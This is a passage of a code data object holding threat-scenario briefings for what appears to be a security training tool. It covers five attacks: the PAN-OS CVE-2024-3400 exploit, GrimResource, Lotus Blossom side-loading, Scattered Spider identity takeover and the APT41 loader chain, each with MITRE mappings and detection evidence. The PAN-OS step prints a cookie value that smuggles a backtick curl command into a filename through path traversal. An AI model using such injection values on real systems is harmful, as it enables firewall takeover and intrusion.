    scenarioId: 'unit42-panos-midnight-eclipse',
    briefing: {
      headline: 'Scenario Briefing: Operation Midnight Eclipse (CVE-2024-3400) — Unauthenticated PAN-OS Firewall Takeover',
      plainSummary:
        'Documented by Palo Alto Networks Unit 42 and Volexity (UTA0218), this scenario shows how a zero-day flaw in PAN-OS GlobalProtect VPN gateways was exploited without any username or password. By placing directory traversal characters and Linux shell commands inside an HTTP SESSID cookie, the attacker tricks the firewall’s telemetry storage into creating an empty file whose filename is actually a command. When the firewall’s built-in root cron job later runs and logs an error about that filename, the shell executes the command inside the filename as root and installs the UPSTYLE Python memory backdoor.',
      diagramTopologySummary:
        'On the diagram: Node ① (UTA0218 Attacker C2) sends the crafted SESSID cookie to Node ②/③ (PA-5220 GlobalProtect Gateway). Inside the firewall, Node ④ (Cron Telemetry & UPSTYLE Python Backdoor) executes root commands and reaches Node ⑤ (running-config.xml & Internal AD) while Node ⑥ (Cortex XSIAM) logs the telemetry.',
      documentedAdvisory: 'Palo Alto Unit 42 Operation Midnight Eclipse · CISA KEV CVE-2024-3400 · MITRE T1190 / T1059.004',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1190',
        plainTitle: 'Using a Crafted SESSID Cookie to Plant a Malicious Filename on the Firewall',
        simpleExplanation:
          'The attacker sends an unauthenticated HTTPS POST request to /ssl-vpn/hipreport.esp on the GlobalProtect interface. Inside the Cookie header, SESSID is set to ../../../../opt/panlogs/tmp/device_telemetry/minute/a`curl ...`. Because PAN-OS fails to strip "../" path traversal sequences, it creates a zero-byte file inside the device telemetry directory whose filename contains a backtick shell command.',
        howItWorksInPractice:
          'At this stage, no code has run yet—the attacker has simply abused the session file writer to plant a specially named file inside the folder that the firewall’s telemetry cron job inspects every minute.',
        diagramAlignment:
          'On the diagram, arrow #1.1→ sends the crafted SESSID cookie from Node ① into Node ②/③ (PA-5220 GlobalProtect), and ⇠#1.2 shows the 0-byte file created under /opt/panlogs/tmp/device_telemetry/minute/.',
        detectionAndEvidence:
          'Documented in Unit 42 Advisory: HTTP POST /ssl-vpn/hipreport.esp with SESSID path traversal creating files in /opt/panlogs/tmp/device_telemetry/minute/.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1059.004',
        plainTitle: 'Firewall Cron Job Evaluates the Filename as Root & Installs the UPSTYLE Backdoor',
        simpleExplanation:
          'Every minute, the firewall’s root cron job runs device_telemetry_send to bundle telemetry files. When the planted filename fails validation, the program writes the filename into an unsanitized shell command to log the error—triggering the backtick command inside the filename as root. This downloads and launches the Python UPSTYLE backdoor, which monitors nginx error logs (/var/log/pan/sslvpn_ngx_error.log) for hidden attacker commands.',
        howItWorksInPractice:
          'Instead of opening a noisy network port on the firewall, UPSTYLE watches the firewall’s own web error log. Whenever the attacker sends a malformed URL that gets logged as a 404/error in sslvpn_ngx_error.log, UPSTYLE parses and runs the embedded command.',
        diagramAlignment:
          'On the diagram, arrow #2.1→ activates Node ④ (Cron & UPSTYLE Python Monitor), and ⇠#2.2 confirms root execution and monitoring of sslvpn_ngx_error.log.',
        detectionAndEvidence:
          'Documented in PAN-OS Tech Support File (/var/log/pan/device_telemetry_send.log) and process tree showing python3 executing base64-encoded UPSTYLE loader.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1552.001',
        plainTitle: 'Stealing Firewall Configuration Secrets & Pivoting into the Internal Network',
        simpleExplanation:
          'The attacker triggers UPSTYLE to extract the firewall’s running-config.xml and master key, writes the output temporarily into a public CSS stylesheet (/var/appweb/sslvpndocs/global-protect/portal/css/bootstrap.min.css) so they can download it over HTTPS, and restores the CSS file contents and timestamps 15 seconds later.',
        howItWorksInPractice:
          'By exfiltrating running-config.xml and the master encryption key, the attacker obtains VPN gateway certificates, local hashes, and internal network routes to pivot into Active Directory.',
        diagramAlignment:
          'On the diagram, arrow #3.1→ connects Node ④ to Node ⑤ (running-config.xml & Internal AD) while Node ⑥ (Cortex XSIAM) flags the CSS modification and SMB pivot.',
        detectionAndEvidence:
          'Documented by Unit 42: Transient modification of bootstrap.min.css followed by touch -r timestamp restoration and internal SMB/LDAP reconnaissance.',
      },
    ],
  },

  'elastic-grimresource-msc': {
    scenarioId: 'elastic-grimresource-msc',
    briefing: {
      headline: 'Scenario Briefing: GrimResource (T1218.014) — Abusing Windows Management Console (.MSC) & apds.dll',
      plainSummary:
        'Published by Elastic Security Labs (June 2024), GrimResource is an execution technique that lets attackers run arbitrary code through Microsoft Management Console (mmc.exe)—the trusted Windows tool used for Event Viewer and Device Manager. By crafting a malicious .msc console file that exploits a legacy cross-site scripting flaw in apds.dll alongside DotNetToJScript deserialization, the attacker spoofs command-line arguments in memory and injects a Cobalt Strike beacon into a sacrificial Windows process.',
      diagramTopologySummary:
        'On the diagram: Node ①/② delivers invoice_audit.msc to Node ③ (Workstation WKS-ENG-14 running mmc.exe). Inside mmc.exe, Node ④ (apds.dll & DotNetToJScript Loader) performs argument spoofing (ArguePatch) and injects Node ⑤ (SecRuntime.dll Cobalt Strike Beacon), alerted by Node ⑥ (Elastic Defend SIEM).',
      documentedAdvisory: 'Elastic Security Labs GrimResource Report (June 2024) · MITRE ATT&CK T1218.014 / T1055.001',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1218.014',
        plainTitle: 'Opening a Crafted .MSC Console File That Abuses apds.dll Redirects',
        simpleExplanation:
          'When the user opens invoice_audit.msc, Windows launches the trusted Microsoft Management Console binary (C:\\Windows\\System32\\mmc.exe, PID 5920). The XML inside the .msc file points a StringTable entry to res://apds.dll/redirect.html?target=javascript:eval(...), forcing mmc.exe to load apds.dll and execute embedded JScript/VBScript inside the MSHTML engine.',
        howItWorksInPractice:
          'Because mmc.exe is a Microsoft-signed system binary, security tools normally allow it to load HTML console views. The redirect flaw in apds.dll lets untrusted script code run inside mmc.exe’s security context.',
        diagramAlignment:
          'On the diagram, arrow #1.1→ shows Node ③ (mmc.exe PID 5920) opening invoice_audit.msc and triggering Node ④ (apds.dll redirect.html), with ⇠#1.2 logging Sysmon EventID 1 & 7.',
        detectionAndEvidence:
          'Documented by Elastic Security Labs: mmc.exe loading C:\\Windows\\System32\\apds.dll alongside mshtml.dll and jscript.dll.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1059.007',
        plainTitle: 'Deserializing a .NET Loader in Memory & Spoofing Process Arguments (ArguePatch)',
        simpleExplanation:
          'The JScript payload uses DotNetToJScript to deserialize a .NET assembly directly inside mmc.exe memory. This .NET loader uses the "ArguePatch" technique: it spawns a sacrificial process with harmless-looking command-line arguments to fool EDR command-line logging, and then overwrites the Process Environment Block (PEB) in memory.',
        howItWorksInPractice:
          'Running the .NET loader via COM deserialization avoids creating a new script interpreter process like powershell.exe or wscript.exe.',
        diagramAlignment:
          'On the diagram, arrow #2.1→ flows inside Node ④ showing DotNetToJScript deserializing the loader and patching PEB arguments, with ⇠#2.2 confirming CLR v4.0.30319 loaded.',
        detectionAndEvidence:
          'Documented by Elastic Security Labs: Unbacked .NET CLR assembly loaded inside jscript.dll / mmc.exe call stack.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1055.001',
        plainTitle: 'Injecting the Cobalt Strike Beacon into RWX Memory (SecRuntime.dll)',
        simpleExplanation:
          'Finally, the .NET loader allocates a 312 KB Read-Write-Execute (RWX) memory region using the native kernel syscall NtAllocateVirtualMemory, copies the obfuscated SecRuntime.dll payload containing a Cobalt Strike beacon into the target process (dllhost.exe), and initiates an outbound HTTPS C2 session.',
        howItWorksInPractice:
          'Allocating cross-process executable memory (PAGE_EXECUTE_READWRITE) from inside mmc.exe triggers kernel ETW memory-protection telemetry in Elastic Defend.',
        diagramAlignment:
          'On the diagram, arrow #3.1→ injects the payload from Node ④ into Node ⑤ (dllhost.exe / SecRuntime.dll) and alerts Node ⑥ (Elastic Defend SIEM).',
        detectionAndEvidence:
          'Documented in Elastic Defend Memory Threat Alert: Cross-process RWX allocation via NtAllocateVirtualMemory from mmc.exe / DotNetToJScript.',
      },
    ],
  },

  'elastic-lotus-blossom-chrysalis': {
    scenarioId: 'elastic-lotus-blossom-chrysalis',
    briefing: {
      headline: 'Scenario Briefing: Lotus Blossom Chrysalis Backdoor — DLL Side-Loading via a Signed Bitdefender Utility',
      plainSummary:
        'Based on Elastic Security Labs’ analysis of the Lotus Blossom APT campaign, this attack uses "DLL Side-Loading" (MITRE T1574.002). Instead of running an untrusted program that antivirus software would block, the attacker places a legitimate, digitally signed Bitdefender utility (BdSubWiz.exe) in a folder alongside a malicious file named log.dll and an encrypted file named chrysalis.bin. When the trusted Bitdefender binary starts, Windows automatically loads the malicious log.dll from the same folder, which decrypts and launches the Chrysalis backdoor in memory.',
      diagramTopologySummary:
        'On the diagram: Node ①/② stages the 3-file package on Node ③ (Victim Host). Node ③ runs signed BdSubWiz.exe, which side-loads Node ④ (malicious log.dll + chrysalis.bin shellcode), establishing persistence and C2 on Node ⑤ while Node ⑥ (Elastic SIEM) flags the unsigned DLL load.',
      documentedAdvisory: 'Elastic Security Labs Lotus Blossom Chrysalis Report · MITRE ATT&CK T1574.002 / T1027',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1574.002',
        plainTitle: 'Trusted Bitdefender Utility (BdSubWiz.exe) Automatically Side-Loads Malicious log.dll',
        simpleExplanation:
          'The attacker stages three files in C:\\ProgramData\\AdobeUpdate\\: the legitimate Bitdefender Submission Wizard executable (BdSubWiz.exe, validly signed), a trojanized log.dll, and chrysalis.bin. When BdSubWiz.exe launches, Windows DLL search-order rules cause it to load log.dll from its own directory before checking System32.',
        howItWorksInPractice:
          'Because the parent process (BdSubWiz.exe) has a valid digital signature from a reputable security vendor, basic application allowlisting rules trust the process creation.',
        diagramAlignment:
          'On the diagram, arrow #1.1→ shows Node ③ (Signed BdSubWiz.exe) loading Node ④ (Unsigned log.dll from ProgramData), with ⇠#1.2 logging Sysmon EventID 7.',
        detectionAndEvidence:
          'Documented in Sysmon EventID 7 (ImageLoad): Signed process BdSubWiz.exe loading unsigned C:\\ProgramData\\AdobeUpdate\\log.dll.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1027',
        plainTitle: 'Reading chrysalis.bin & Decrypting the Backdoor in Memory with RC4 + API Hashing',
        simpleExplanation:
          'Inside log.dll, the initialization routine opens chrysalis.bin from disk, allocates a private executable memory buffer, and decrypts the binary blob using a custom RC4 key. To hide its capabilities from static analysis tools, the shellcode resolves Windows APIs dynamically using ROR13 hashes instead of readable function names.',
        howItWorksInPractice:
          'Splitting the attack into three files (signed EXE + tiny loader DLL + encrypted binary blob) ensures that chrysalis.bin looks like random data on disk and only becomes executable code inside RAM.',
        diagramAlignment:
          'On the diagram, arrow #2.1→ inside Node ④ shows log.dll decrypting chrysalis.bin into memory, and ⇠#2.2 confirms dynamic ROR13 API resolution completed.',
        detectionAndEvidence:
          'Documented by Elastic Security Labs: PEB InMemoryOrderModuleList walking and ROR13 API hashing from unbacked memory inside BdSubWiz.exe.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1543.003',
        plainTitle: 'Registering Persistence & Opening an Encrypted HTTPS C2 Channel',
        simpleExplanation:
          'Once active in memory, the Chrysalis implant establishes persistence so BdSubWiz.exe restarts automatically on reboot, collects host and Active Directory reconnaissance data, and initiates an HTTPS beacon to the Lotus Blossom command-and-control server.',
        howItWorksInPractice:
          'A standalone crash-submission wizard should never maintain continuous long-lived HTTPS connections or register auto-start services from C:\\ProgramData\\.',
        diagramAlignment:
          'On the diagram, arrow #3.1→ connects Node ④ to Node ⑤/① (C2 Server & Service Registry) and alerts Node ⑥ (SIEM).',
        detectionAndEvidence:
          'Documented in Registry/Service Creation logs and outbound TLS beacon originating from BdSubWiz.exe.',
      },
    ],
  },

  'unit42-scattered-spider-cloud': {
    scenarioId: 'unit42-scattered-spider-cloud',
    briefing: {
      headline: 'Scenario Briefing: Scattered Spider (Muddled Libra) — Helpdesk Social Engineering to Hybrid Cloud Takeover',
      plainSummary:
        'Documented by Palo Alto Unit 42 and CISA Advisory AA23-320A, Scattered Spider (UNC3944 / Muddled Libra) bypasses perimeter firewalls by targeting people and identity providers directly. The attacker impersonates an employee on a phone call to the IT Helpdesk or bombards the victim with MFA push notifications until they approve one. Once inside the Okta/Entra ID Single Sign-On (SSO) portal, the attacker enrolls their own FIDO2 authenticator token so they can log in anytime, pivots to an Azure Entra Connect synchronization server, and extracts hybrid cloud credentials.',
      diagramTopologySummary:
        'On the diagram: Node ① (Scattered Spider Operator) targets Node ② (Okta / Entra ID SSO Gateway) via social engineering & MFA fatigue. From there, the attacker registers a rogue MFA factor on Node ③ (Cloud Identity Tenant), pivots to Node ④/⑤ (Entra Connect Sync Server & Cloud Vault), and triggers alerts on Node ⑥ (Cloud SIEM).',
      documentedAdvisory: 'CISA Advisory AA23-320A · Palo Alto Unit 42 Muddled Libra · MITRE ATT&CK T1078.004 / T1098.005',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1621',
        plainTitle: 'Impersonating an Employee at the IT Helpdesk & Triggering MFA Push Fatigue',
        simpleExplanation:
          'Using credentials harvested via SMS phishing (smishing), the attacker initiates repeated login attempts for a privileged IT engineer while simultaneously calling the corporate IT Helpdesk to request an MFA reset or pressuring the user into accepting an MFA push prompt.',
        howItWorksInPractice:
          'In Identity Provider logs (Okta SystemLog / Entra SignInLogs), this produces a burst of denied MFA push challenges followed by a single accepted prompt from a new residential proxy IP address.',
        diagramAlignment:
          'On the diagram, arrow #1.1→ flows from Node ① (Operator Residential Proxy) to Node ② (SSO Identity Gateway), and ⇠#1.2 returns the approved OIDC/SAML session token.',
        detectionAndEvidence:
          'Documented in Okta SystemLog / Entra SignInLogs: 14 consecutive MFA push rejections followed by a single MFA approval from an unfamiliar residential ASN.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1098.005',
        plainTitle: 'Enrolling the Attacker’s Own FIDO2 Authenticator to Survive Password Resets',
        simpleExplanation:
          'Within minutes of accessing the SSO dashboard, the attacker registers a secondary FIDO2 WebAuthn authenticator or Authenticator App under their own control and enrolls a virtual machine into Intune/Entra ID so their session satisfies "Compliant Device" Conditional Access policies.',
        howItWorksInPractice:
          'Adding a second MFA device ensures that even if the real employee notices the strange push notifications, the attacker can silently authenticate using their newly registered FIDO2 factor.',
        diagramAlignment:
          'On the diagram, arrow #2.1→ connects Node ② and Node ③ (Identity Directory), registering the rogue MFA factor, with ⇠#2.2 returning user.mfa.factor.activate.',
        detectionAndEvidence:
          'Documented in Identity Audit Logs: user.mfa.factor.activate (FIDO2/WebAuthn) executed minutes after a new-location sign-in.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1552.001',
        plainTitle: 'Pivoting to the Entra Connect Server & Extracting Hybrid Sync Credentials',
        simpleExplanation:
          'Using the IT engineer’s cloud admin permissions, the attacker accesses the hybrid Azure AD / Entra Connect server, queries the local ADSync database to decrypt the MSOL_ synchronization account credentials (which hold Directory Replication / DCSync rights), and exports sensitive cloud data.',
        howItWorksInPractice:
          'The Entra Connect server bridges on-premises Active Directory and the cloud tenant. Compromising its MSOL_ sync account bridges the attacker from cloud identity straight into Tier-0 Domain Admin access.',
        diagramAlignment:
          'On the diagram, arrow #3.1→ moves from Node ③/④ (Entra Connect Sync Process) to Node ⑤ (Hybrid Cloud Vault) and alerts Node ⑥ (Cloud SIEM).',
        detectionAndEvidence:
          'Documented by Unit 42 & CISA AA23-320A: Unauthorized access to ADSync database (mms_management_agent) and anomalous Microsoft Graph API bulk export.',
      },
    ],
  },

  'elastic-apt41-dustpan-stealthvector': {
    scenarioId: 'elastic-apt41-dustpan-stealthvector',
    briefing: {
      headline: 'Scenario Briefing: APT41 DUSTPAN & STEALTHVECTOR — Multi-Stage ChaCha20 Memory Loader Chain',
      plainSummary:
        'Based on Elastic Security Labs and Mandiant research on APT41, this scenario walks through a three-layer in-memory loader chain. First, a legitimate signed vendor binary side-loads the DUSTPAN dropper DLL (version.dll). Second, DUSTPAN reads an encrypted file from disk and decrypts it in memory using the ChaCha20 cipher to launch the STEALTHVECTOR reflective loader. Third, STEALTHVECTOR maps the final Cobalt Strike or DUSTTRAP implant into memory while zeroing out its own PE headers so memory scanners cannot easily identify it.',
      diagramTopologySummary:
        'On the diagram: Node ①/② stages the signed host package on Node ③ (Compromised Server). Node ③ side-loads DUSTPAN into Node ④ (STEALTHVECTOR ChaCha20 Memory Loader), which decrypts the final implant communicating with Node ⑤ (APT41 C2) while Node ⑥ (Elastic SIEM) captures the unbacked memory telemetry.',
      documentedAdvisory: 'Elastic Security Labs & Mandiant APT41 DUSTPAN / STEALTHVECTOR Analysis · MITRE T1620 / T1140',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1574.002',
        plainTitle: 'Signed Vendor Executable Side-Loads the DUSTPAN Dropper DLL',
        simpleExplanation:
          'The attacker launches a legitimate, digitally signed vendor binary on the target server that automatically imports version.dll from its local working directory. This trojanized version.dll is actually the APT41 DUSTPAN dropper, which hooks execution inside the trusted process.',
        howItWorksInPractice:
          'By hijacking a DLL loaded by a validly signed executable, DUSTPAN executes inside a trusted process context without dropping an unsigned .exe file.',
        diagramAlignment:
          'On the diagram, arrow #1.1→ shows Node ③ (Signed Host Binary) loading trojanized version.dll (DUSTPAN) in Node ④, with ⇠#1.2 logging Sysmon EventID 7.',
        detectionAndEvidence:
          'Documented in Sysmon EventID 7: Signed executable loading unsigned version.dll (DUSTPAN dropper) from a non-System32 directory.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1140',
        plainTitle: 'DUSTPAN Decrypts the ChaCha20 Payload & Launches STEALTHVECTOR in Memory',
        simpleExplanation:
          'DUSTPAN reads an encrypted companion file (data.dat) from disk and uses a 256-bit ChaCha20 stream cipher key to decrypt it directly in RAM. The decrypted payload is STEALTHVECTOR, a custom reflective PE loader that maps the next stage into memory and wipes its own MZ/PE headers.',
        howItWorksInPractice:
          'Wiping the "MZ" and "PE" magic bytes at the start of the allocated memory page prevents basic memory scanners from recognizing the buffer as an executable DLL.',
        diagramAlignment:
          'On the diagram, arrow #2.1→ inside Node ④ traces the ChaCha20 decryption and STEALTHVECTOR reflective mapping, with ⇠#2.2 confirming PE headers zeroed out.',
        detectionAndEvidence:
          'Documented by Elastic Security Labs: In-memory ChaCha20 quarter-round constants ("expand 32-byte k") and zeroed MZ/PE headers in executable VAD regions.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1620',
        plainTitle: 'Decrypting the Final Implant Configuration & Establishing TLS C2',
        simpleExplanation:
          'STEALTHVECTOR transfers execution to the embedded implant (Cobalt Strike / DUSTTRAP), which unpacks its encrypted configuration block containing C2 domains, custom HTTP headers, and sleep jitter, and opens an outbound TLS session.',
        howItWorksInPractice:
          'Even with wiped PE headers, EDR kernel call-stack telemetry spots threads initiating network connections whose instruction pointers reside in unbacked private memory.',
        diagramAlignment:
          'On the diagram, arrow #3.1→ connects Node ④ (Reflective Implant) to Node ⑤ (APT41 C2 Endpoint) and triggers Node ⑥ (SIEM Alert).',
        detectionAndEvidence:
          'Documented in EDR Memory & Network Telemetry: Thread call stack originating from unbacked memory initiating periodic TLS beacons.',
      },
    ],
  },
};
